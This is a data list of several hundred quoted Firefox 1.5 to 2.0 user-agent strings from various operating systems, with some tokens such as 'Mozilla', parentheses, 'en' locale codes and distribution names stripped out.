	"/5.0 X11; U; SunOS i86pc; -US; rv:1.8.1 Gecko/20061024 Firefox/2.0"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1 Gecko/20061202 Firefox/2.0"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1 Gecko/20061128 Firefox/2.0"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1 Gecko/20061122 Firefox/2.0"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1 Gecko/20061023 SUSE/2.0-37 Firefox/2.0"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1 Gecko/20060601 Firefox/2.0 -edgy"
	"/5.0 X11; U; Linux x86-64; -US; rv:1.8.1 Gecko/20061010 Firefox/2.0"
	"/5.0 X11; U; Linux i686; zh-TW; rv:1.8.1 Gecko/20061010 Firefox/2.0"
	"/5.0 X11; U; Linux i686; tr-TR; rv:1.8.1 Gecko/20061023 SUSE/2.0-30 Firefox/2.0"
	"/5.0 X11; U; Linux i686; pl; rv:1.8.1 Gecko/20061127 Firefox/2.0 Gentoo Linux"
	"/5.0 X11; U; Linux i686; pl; rv:1.8.1 Gecko/20061127 Firefox/2.0"
	"/5.0 X11; U; Linux i686; pl; rv:1.8.1 Gecko/20061024 Firefox/2.0 Swiftfox"
	"/5.0 X11; U; Linux i686; pl; rv:1.8.1 Gecko/20061010 Firefox/2.0 "
	"/5.0 X11; U; Linux i686; pl; rv:1.8.1 Gecko/20061010 Firefox/2.0"
	"/5.0 X11; U; Linux i686; pl; rv:1.8.1 Gecko/20061003 Firefox/2.0 "
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.8.1 Gecko/20061010 Firefox/2.0"
	"/5.0 Windows; U; Windows NT 5.0; ; rv:1.8.0.7 Gecko/20060917 Firefox/1.9.0.1"
	"/5.0 Windows; U; Windows NT 5.0; ; rv:1.8.0.10 Gecko/20070216 Firefox/1.9.0.1"
	"/5.0 Windows; U; Windows NT 5.0; ; rv:1.8.0.1 Gecko/20060111 Firefox/1.9.0"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9a1 Gecko/20060112 Firefox/1.6a1"
	"/5.0 X11; U; Linux i686; -US; rv:1.9a1 Gecko/20060217 Firefox/1.6a1"
	"/5.0 X11; U; Linux i686; -US; rv:1.9a1 Gecko/20060117 Firefox/1.6a1"
	"/5.0 X11; U; Linux i686; -US; rv:1.9a1 Gecko/20051215 Firefox/1.6a1 Swiftfox"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.9a1 Gecko/20060127 Firefox/1.6a1"
	"/5.0 Windows; U; Windows NT 5.2 x64; -US; rv:1.9a1 Gecko/20060214 Firefox/1.6a1"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9a1 Gecko/20060323 Firefox/1.6a1"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9a1 Gecko/20060121 Firefox/1.6a1"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9a1 Gecko/20051220 Firefox/1.6a1"
	"/5.0 Windows NT 5.1; rv:1.9a1  Gecko/20060217 Firefox/1.6a1"
	"/5.0 BeOS; U; BeOS BePC; -US; rv:1.9a1 Gecko/20051002 Firefox/1.6a1"
	"/5.0 X11; U; OpenBSD amd64; -US; rv:1.8.0.9 Gecko/20070101 Firefox/1.5.0.9"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.0.9 Gecko/20070126 /dapper-security Firefox/1.5.0.9"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.9 Gecko/20071025 Firefox/1.5.0.9 -2.0.0.9-2"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.9 Gecko/20070316 CentOS/1.5.0.9-10.el5.centos Firefox/1.5.0.9 pango-"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.9 Gecko/20070126 /dapper-security Firefox/1.5.0.9"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.9 Gecko/20070102 /dapper-security Firefox/1.5.0.9"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.9 Gecko/20061221 /1.5.0.9-1.fc5 Firefox/1.5.0.9"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.9 Gecko/20061219 /1.5.0.9-1.fc6 Firefox/1.5.0.9 pango-"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.9 Gecko/20061215  /1.5.0.9-0.1.el4 Firefox/1.5.0.9"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.9 Gecko/20060911 SUSE/1.5.0.9-3.2 Firefox/1.5.0.9"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.9 Gecko/20060911 SUSE/1.5.0.9-0.2 Firefox/1.5.0.9"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.0.9 Gecko/20061219 /1.5.0.9-1.fc6 Firefox/1.5.0.9 pango-"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.8.0.9 Gecko/20061206 Firefox/1.5.0.9"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.8.0.9 Gecko/20061206 Firefox/1.5.0.9"
	"/5.0 Windows; U; Windows NT 5.1; zh-CN; rv:1.8.0.9 Gecko/20061206 Firefox/1.5.0.9"
	"/5.0 Windows; U; Windows NT 5.1; tr; rv:1.8.0.9 Gecko/20061206 Firefox/1.5.0.9"
	"/5.0 Windows; U; Windows NT 5.1; -BR; rv:1.8.0.9 Gecko/20061206 Firefox/1.5.0.9"
	"/5.0 Windows; U; Windows NT 5.1; pl; rv:1.8.0.9 Gecko/20061206 Firefox/1.5.0.9"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.8.0.9 Gecko/20061206 Firefox/1.5.0.9"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.8.0.9 Gecko/20061206 Firefox/1.5.0.9"
	"/5.0 X11; U; OpenBSD i386; -US; rv:1.8.0.8 Gecko/20061110 Firefox/1.5.0.8"
	"/5.0 X11; U; Linux i686; sv-SE; rv:1.8.0.8 Gecko/20061108 /1.5.0.8-1.fc5 Firefox/1.5.0.8"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.0.8 Gecko/20061213 Firefox/1.5.0.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.8 Gecko/20061115 /dapper-security Firefox/1.5.0.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.8 Gecko/20061110 Firefox/1.5.0.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.8 Gecko/20061107 /1.5.0.8-1.fc6 Firefox/1.5.0.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.8 Gecko/20061025 Firefox/1.5.0.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.8 Gecko/20060911 SUSE/1.5.0.8-0.2 Firefox/1.5.0.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.8 Gecko/20060802 /1.5.0.8-1.1mdv2007.0 2007.0 Firefox/1.5.0.8"
	"/5.0 X11; U; Linux i686; -GB; rv:1.8.0.8 Gecko/20061025 Firefox/1.5.0.8"
	"/5.0 X11; U; Linux i686; ; rv:1.8.0.8 Gecko/20061115 /dapper-security Firefox/1.5.0.8"
	"/5.0 X11; U; Linux i686; ; rv:1.8.0.8 Gecko/20061025 Firefox/1.5.0.8"
	"/5.0 X11; U; Linux i686; ; rv:1.8.0.8 Gecko/20060911 SUSE/1.5.0.8-0.2 Firefox/1.5.0.8"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.0.8 Gecko/20061025 Firefox/1.5.0.8"
	"/5.0 X11; U; Linux Gentoo i686; pl; rv:1.8.0.8 Gecko/20061219 Firefox/1.5.0.8"
	"/5.0 X11; U; FreeBSD i386; -US; rv:1.8.0.8 Gecko/20061210 Firefox/1.5.0.8"
	"/5.0 X11; U; FreeBSD amd64; -US; rv:1.8.0.8 Gecko/20061116 Firefox/1.5.0.8"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.8.0.8 Gecko/20061025 Firefox/1.5.0.8"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.8.0.8 Gecko/20061025 Firefox/1.5.0.8"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.8.0.8 Gecko/20061025 Firefox/1.5.0.8"
	"/5.0 X11; U; SunOS ; -US; rv:1.8.0.7 Gecko/20060915 Firefox/1.5.0.7"
	"/5.0 X11; U; OpenBSD i386; -US; rv:1.8.0.7 Gecko/20061017 Firefox/1.5.0.7"
	"/5.0 X11; U; OpenBSD i386; -US; rv:1.8.0.7 Gecko/20060920 Firefox/1.5.0.7"
	"/5.0 X11; U; NetBSD amd64; fr-FR; rv:1.8.0.7 Gecko/20061102 Firefox/1.5.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.0.7 Gecko/20060924 Firefox/1.5.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.0.7 Gecko/20060921 /dapper-security Firefox/1.5.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.0.7 Gecko/20060919 Firefox/1.5.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.0.7 Gecko/20060911 Firefox/1.5.0.7"
	"/5.0 X11; U; Linux i686; sk; rv:1.8.0.7 Gecko/20060909 Firefox/1.5.0.7"
	"/5.0 X11; U; Linux i686; ; rv:1.8.0.7 Gecko/20060921 /dapper-security Firefox/1.5.0.7"
	"/5.0 X11; U; Linux i686; pl; rv:1.8.0.7 Gecko/20060914 Firefox/1.5.0.7 Swiftfox"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.8.0.7 Gecko/20060914 Firefox/1.5.0.7 Swiftfox Mnenhy/0.7.4.666"
	"/5.0 X11; U; Linux i686; ko-KR; rv:1.8.0.7 Gecko/20060913 /1.5.0.7-1.fc5 Firefox/1.5.0.7 pango-"
	"/5.0 X11; U; Linux i686; ; rv:1.8.0.7 Gecko/20060911 SUSE/1.5.0.7-0.1 Firefox/1.5.0.7"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.0.7 Gecko/20060921 /dapper-security Firefox/1.5.0.7"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.0.7 Gecko/20060909 Firefox/1.5.0.7"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.8.0.7 Gecko/20060830 Firefox/1.5.0.7 -+1.5.0.7-1~bpo.1"
	"/5.0 X11; U; Linux i686; es-AR; rv:1.8.0.7 Gecko/20060909 Firefox/1.5.0.7"
	"/5.0 X11; U; Linux i686; -ZW; rv:1.8.0.7 Gecko/20061018 Firefox/1.5.0.7"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.7 Gecko/20061014 Firefox/1.5.0.7"
	"/5.0 X11; U; Linux i686; -BR; rv:1.8.0.6 Gecko/20060728 Firefox/1.5.0.6"
	"/5.0 X11; U; Linux i686; nl; rv:1.8.0.6 Gecko/20060728 Firefox/1.5.0.6"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.0.6 Gecko/20060728 Firefox/1.5.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.6 Gecko/20060905 /1.5.0.6-10 Firefox/1.5.0.6 pango-"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.6 Gecko/20060808 /1.5.0.6-2.fc5 Firefox/1.5.0.6 pango-"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.6 Gecko/20060807 Firefox/1.5.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.6 Gecko/20060803 Firefox/1.5.0.6 Swiftfox"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.6 Gecko/20060802 Firefox/1.5.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.6 Gecko/20060728 SUSE/1.5.0.6-0.1 Firefox/1.5.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.6 Gecko/20060728 Firefox/1.5.0.6 -+1.5.0.6-4"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.6 Gecko/20060728 Firefox/1.5.0.6 -+1.5.0.6-1"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.6 Gecko/20060728 Firefox/1.5.0.6"
	"/5.0 X11; U; Linux i686; -GB; rv:1.8.0.6 Gecko/20060808 /1.5.0.6-2.fc5 Firefox/1.5.0.6"
	"/5.0 X11; U; Linux i686; ; rv:1.8.0.6 Gecko/20060808 /1.5.0.6-2.fc5 Firefox/1.5.0.6 pango-"
	"/5.0 X11; U; Linux i686 x86_64; zh-TW; rv:1.8.0.6 Gecko/20060728 Firefox/1.5.0.6"
	"/5.0 X11; U; Linux i686 x86_64; nl; rv:1.8.0.6 Gecko/20060728 SUSE/1.5.0.6-1.2 Firefox/1.5.0.6"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.0.6 Gecko/20060728 SUSE/1.5.0.6-1.2 Firefox/1.5.0.6"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.0.6 Gecko/20060728 Firefox/1.5.0.6"
	"/5.0 X11; U; Linux i686 x86_64; ; rv:1.8.0.6 Gecko/20060728 SUSE/1.5.0.6-1.3 Firefox/1.5.0.6"
	"/5.0 X11; U; Linux i686 x86_64; ; rv:1.8.0.6 Gecko/20060728 Firefox/1.5.0.6"
	"/5.0 X11; U; SunOS i86pc; -US; rv:1.8.0.5 Gecko/20060728 Firefox/1.5.0.5"
	"/5.0 X11; U; OpenBSD i386; -US; rv:1.8.0.5 Gecko/20060819 Firefox/1.5.0.5"
	"/5.0 X11; U; NetBSD i386; -US; rv:1.8.0.5 Gecko/20060818 Firefox/1.5.0.5"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.0.5 Gecko/20060911 Firefox/1.5.0.5"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.0.5 Gecko/20060731 /dapper-security Firefox/1.5.0.5"
	"/5.0 X11; U; Linux i686; sv-SE; rv:1.8.0.5 Gecko/20060731 /dapper-security Firefox/1.5.0.5"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.8.0.5 Gecko/20060731 /dapper-security Firefox/1.5.0.5 Mnenhy/0.7.4.666"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.0.5 Gecko/20060731 /dapper-security Firefox/1.5.0.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.5 Gecko/20060831 Firefox/1.5.0.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.5 Gecko/20060820 Firefox/1.5.0.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.5 Gecko/20060813 Firefox/1.5.0.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.5 Gecko/20060812 Firefox/1.5.0.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.5 Gecko/20060806 Firefox/1.5.0.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.5 Gecko/20060803 Firefox/1.5.0.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.5 Gecko/20060801 Firefox/1.5.0.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.5 Gecko/20060731 /dapper-security Firefox/1.5.0.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.5 Gecko/20060719 Firefox/1.5.0.5"
	"/5.0 X11; U; Linux i686; -GB; rv:1.8.0.5 Gecko/20060731 /dapper-security Firefox/1.5.0.5"
	"/5.0 X11; U; Linux i686; ; rv:1.8.0.5 Gecko/20060731 /dapper-security Firefox/1.5.0.5"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.0.5 Gecko/20060726  /1.5.0.5-0.el4.1 Firefox/1.5.0.5 pango-"
	"/5.0 X11; U; OpenBSD i386; -US; rv:1.8.0.4 Gecko/20060628 Firefox/1.5.0.4"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.0.4 Gecko/20060608 /dapper-security Firefox/1.5.0.4"
	"/5.0 X11; U; Linux i686; ; rv:1.8.0.4 Gecko/20060508 Firefox/1.5.0.4"
	"/5.0 X11; U; Linux i686; -BR; rv:1.8.0.4 Gecko/20060608 /dapper-security Firefox/1.5.0.4"
	"/5.0 X11; U; Linux i686; pl; rv:1.8.0.4 Gecko/20060614 /1.5.0.4-1.2.fc5 Firefox/1.5.0.4 pango- Mnenhy/0.7.4.0"
	"/5.0 X11; U; Linux i686; pl; rv:1.8.0.4 Gecko/20060527 SUSE/1.5.0.4-1.7 Firefox/1.5.0.4 Mnenhy/0.7.4.0"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.8.0.4 Gecko/20060608 /dapper-security Firefox/1.5.0.4"
	"/5.0 X11; U; Linux i686; nl; rv:1.8.0.4 Gecko/20060608 /dapper-security Firefox/1.5.0.4"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.8.0.4 Gecko/20060608 /dapper-security Firefox/1.5.0.4"
	"/5.0 X11; U; Linux i686; es-AR; rv:1.8.0.4 Gecko/20060608 /dapper-security Firefox/1.5.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.4 Gecko/20060716 Firefox/1.5.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.4 Gecko/20060711 Firefox/1.5.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.4 Gecko/20060704 Firefox/1.5.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.4 Gecko/20060629 Firefox/1.5.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.4 Gecko/20060614 /1.5.0.4-1.2.fc5 Firefox/1.5.0.4 pango-"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.4 Gecko/20060613 Firefox/1.5.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.4 Gecko/20060608 /dapper-security Firefox/1.5.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.4 Gecko/20060527 SUSE/1.5.0.4-1.3 Firefox/1.5.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.4 Gecko/20060508 Firefox/1.5.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.4 Gecko/20060406 Firefox/1.5.0.4 -+1.5.0.4-1"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.0.3 Gecko/20060523 /dapper Firefox/1.5.0.3"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.0.3 Gecko/20060522 Firefox/1.5.0.3"
	"/5.0 X11; U; Linux i686; -BR; rv:1.8.0.3 Gecko/20060523 /dapper Firefox/1.5.0.3"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.3 Gecko/20060523 /dapper Firefox/1.5.0.3"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.3 Gecko/20060504 /1.5.0.3-1.1.fc5 Firefox/1.5.0.3 pango-"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.3 Gecko/20060426 Firefox/1.5.0.3"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.3 Gecko/20060425 SUSE/1.5.0.3-7 Firefox/1.5.0.3"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.3 Gecko/20060326 Firefox/1.5.0.3 -+1.5.0.3-2"
	"/5.0 X11; U; Linux i686; -GB; rv:1.8.0.3 Gecko/20060426 Firefox/1.5.0.3"
	"/5.0 X11; U; Linux i686; ; rv:1.8.0.3 Gecko/20060426 Firefox/1.5.0.3"
	"/5.0 X11; U; Linux i686; ; rv:1.8.0.3 Gecko/20060425 SUSE/1.5.0.3-7 Firefox/1.5.0.3"
	"/5.0 X11; U; Linux i686 x86_64; ; rv:1.8.0.3 Gecko/20060425 SUSE/1.5.0.3-7 Firefox/1.5.0.3"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.0.3 Gecko/20060426 Firefox/1.5.0.3"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.4 Gecko/20060508 Firefox/1.5.0.3"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.3 Gecko/20060426 Firefox/1.5.0.3"
	"/5.0 Windows; U; Windows NT 5.1; -GB; rv:1.8.0.3 Gecko/20060426 Firefox/1.5.0.3"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.8.0.3 Gecko/20060426 Firefox/1.5.0.3"
	"/5.0 Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3 Gecko/20060426 Firefox/1.5.0.3"
	"/5.0 Windows; U;  9x 4.90; -US; rv:1.8.0.3 Gecko/20060426 Firefox/1.5.0.3"
	"/5.0 Macintosh; U; PPC Mac OS X Mach-O; es-ES; rv:1.8.0.3 Gecko/20060426 Firefox/1.5.0.3"
	"/5.0 Windows; U; Windows NT 4.0; -US; rv:1.8.0.2 Gecko/20060418 Firefox/1.5.0.2;"
	"/5.0 X11; U; OpenBSD sparc64; pl-PL; rv:1.8.0.2 Gecko/20060429 Firefox/1.5.0.2"
	"/5.0 X11; U; OpenBSD sparc64; -CA; rv:1.8.0.2 Gecko/20060429 Firefox/1.5.0.2"
	"/5.0 X11; U; Linux x86_64; -AT; rv:1.8.0.2 Gecko/20060422 Firefox/1.5.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.2 Gecko/20060419 /1.5.0.2-1.2.fc5 Firefox/1.5.0.2 pango-"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.2 Gecko/20060308 Firefox/1.5.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.2 Gecko Firefox/1.5.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20050921 Firefox/1.5.0.2 /1.0.6-15mdk 2006.0"
	"/5.0 X11; U; FreeBSD i386; -US; rv:1.8.0.2 Gecko/20060414 Firefox/1.5.0.2"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.8.0.2 Gecko/20060308 Firefox/1.5.0.2"
	"/5.0 Windows; U; Windows NT 5.1; zh-TW; rv:1.8.0.2 Gecko/20060308 Firefox/1.5.0.2"
	"/5.0 Windows; U; Windows NT 5.1; sv-SE; rv:1.8.0.2 Gecko/20060308 Firefox/1.5.0.2"
	"/5.0 Windows; U; Windows NT 5.1; -BR; rv:1.8.0.2 Gecko/20060308 Firefox/1.5.0.2"
	"/5.0 Windows; U; Windows NT 5.1; pl; rv:1.8.0.2 Gecko/20060308 Firefox/1.5.0.2"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.8.0.2 Gecko/20060308 Firefox/1.5.0.2"
	"/5.0 Windows; U; Windows NT 5.1; fr; rv:1.8.0.2 Gecko/20060308 Firefox/1.5.0.2"
	"/5.0 Windows; U; Windows NT 5.1; es-ES; rv:1.8.0.2 Gecko/20060308 Firefox/1.5.0.2"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.2 Gecko/20060419 Firefox/1.5.0.2"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.2 Gecko/20060406 Firefox/1.5.0.2"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.2 Gecko/20060309 Firefox/1.5.0.2"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.2 Gecko/20060308 Firefox/1.5.0.2"
	"/5.0 X11; U; Linux i686; sv-SE; rv: Gecko/20071126 /dapper-security Firefox/"
	"/5.0 X11; U; Linux i686; -US; rv: Gecko/20080207 /dapper-security Firefox/"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.0.12 Gecko/20080419 CentOS/1.5.0.12-0.15.el4.centos Firefox/1.5.0.12 pango-"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.0.12 Gecko/20070718  /1.5.0.12-3.el5 Firefox/1.5.0.12"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.0.12 Gecko/20070530 /1.5.0.12-1.fc6 Firefox/1.5.0.12"
	"/5.0 X11; U; Linux i686; pl; rv:1.8.0.12 Gecko/20070508 Firefox/1.5.0.12"
	"/5.0 X11; U; Linux i686; nl; rv:1.8.0.12 Gecko/20070601 /dapper-security Firefox/1.5.0.12"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.12 Gecko/20071126 /1.5.0.12-7.fc6 Firefox/1.5.0.12"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.12 Gecko/20070719 CentOS/1.5.0.12-0.3.el4.centos Firefox/1.5.0.12"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.12 Gecko/20070530 /1.5.0.12-1.fc6 Firefox/1.5.0.12"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.12 Gecko/20070529  /1.5.0.12-0.1.el4 Firefox/1.5.0.12"
	"/5.0 X11; U; Linux i686; -GB; rv:1.8.0.12 Gecko/20070718 /1.5.0.12-4.fc6 Firefox/1.5.0.12"
	"/5.0 X11; U; Linux i686; ; rv:1.8.0.12 Gecko/20070731 /dapper-security Firefox/1.5.0.12"
	"/5.0 X11; U; Linux i686; ; rv:1.8.0.12 Gecko/20070719 CentOS/1.5.0.12-3.el5.centos Firefox/1.5.0.12"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.0.12 Gecko/20080326 CentOS/1.5.0.12-14.el5.centos Firefox/1.5.0.12"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.0.12 Gecko/20070731 /dapper-security Firefox/1.5.0.12"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.8.0.12 Gecko/20070508 Firefox/1.5.0.12 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.8.0.12 Gecko/20070508 Firefox/1.5.0.12"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.8.0.12 Gecko/20070508 Firefox/1.5.0.12"
	"/5.0 Windows; U; Windows NT 5.1; sv-SE; rv:1.8.0.12 Gecko/20070508 Firefox/1.5.0.12"
	"/5.0 Windows; U; Windows NT 5.1; nl; rv:1.8.0.12 Gecko/20070508 Firefox/1.5.0.12"
	"/5.0 Windows; U; Windows NT 5.1; ko; rv:1.8.0.12 Gecko/20070508 Firefox/1.5.0.12"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.8.0.11 Gecko/20070327 /dapper-security Firefox/1.5.0.11"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.11 Gecko/20070312 Firefox/1.5.0.11"
	"/5.0 X11; U; Linux i686; ; rv:1.8.0.11 Gecko/20070327 /dapper-security Firefox/1.5.0.11"
	"/5.0 X11; U; Linux i686; cs-CZ; rv:1.8.0.11 Gecko/20070327 /dapper-security Firefox/1.5.0.11"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.0.11 Gecko/20070312 Firefox/1.5.0.11"
	"/5.0 Windows; U; Windows NT 5.1; pl; rv:1.8.0.11 Gecko/20070312 Firefox/1.5.0.11"
	"/5.0 Windows; U; Windows NT 5.1; nl; rv:1.8.0.11 Gecko/20070312 Firefox/1.5.0.11"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.8.0.11 Gecko/20070312 Firefox/1.5.0.11"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.8.0.11 Gecko/20070312 Firefox/1.5.0.11"
	"/5.0 Windows; U; Windows NT 5.1; fr; rv:1.8.0.11 Gecko/20070312 Firefox/1.5.0.11"
	"/5.0 Windows; U; Windows NT 5.1; fi; rv:1.8.0.11 Gecko/20070312 Firefox/1.5.0.11"
	"/5.0 Windows; U; Windows NT 5.1; es-ES; rv:1.8.0.11 Gecko/20070312 Firefox/1.5.0.11"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.12 Gecko/20070508 Firefox/1.5.0.11"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.11 Gecko/20070312 Firefox/1.5.0.11"
	"/5.0 Windows; U; Windows NT 5.0; pl; rv:1.8.0.11 Gecko/20070312 Firefox/1.5.0.11"
	"/5.0 Windows; U; Windows NT 5.0; ; rv:1.8.0.11 Gecko/20070312 Firefox/1.5.0.11"
	"/5.0 Windows; U; Windows NT 5.0; fr; rv:1.8.0.11 Gecko/20070312 Firefox/1.5.0.11"
	"/5.0 Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.11 Gecko/20070312 Firefox/1.5.0.11"
	"/5.0 Windows; U; Windows NT 5.0; -US; rv:1.8.0.11 Gecko/20070312 Firefox/1.5.0.11"
	"/5.0 Windows; U; Windows NT 5.0; ; rv:1.8.0.11 Gecko/20070312 Firefox/1.5.0.11"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv: Gecko/20070207 Firefox/"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv: Gecko/20070211 Firefox/"
	"/5.0 X11; U; OpenBSD ppc; -US; rv:1.8.0.10 Gecko/20070223 Firefox/1.5.0.10"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.0.10 Gecko/20070409 CentOS/1.5.0.10-2.el5.centos Firefox/1.5.0.10"
	"/5.0 X11; U; Linux i686; zh-TW; rv:1.8.0.10 Gecko/20070508 /1.5.0.10-1.fc5 Firefox/1.5.0.10"
	"/5.0 X11; U; Linux i686; ; rv:1.8.0.10 Gecko/20070510 /1.5.0.10-6.fc6 Firefox/1.5.0.10"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.0.10 Gecko/20070223 /1.5.0.10-1.fc5 Firefox/1.5.0.10 pango-"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.10 Gecko/20070510 /1.5.0.10-6.fc6 Firefox/1.5.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.10 Gecko/20070409 CentOS/1.5.0.10-2.el5.centos Firefox/1.5.0.10"
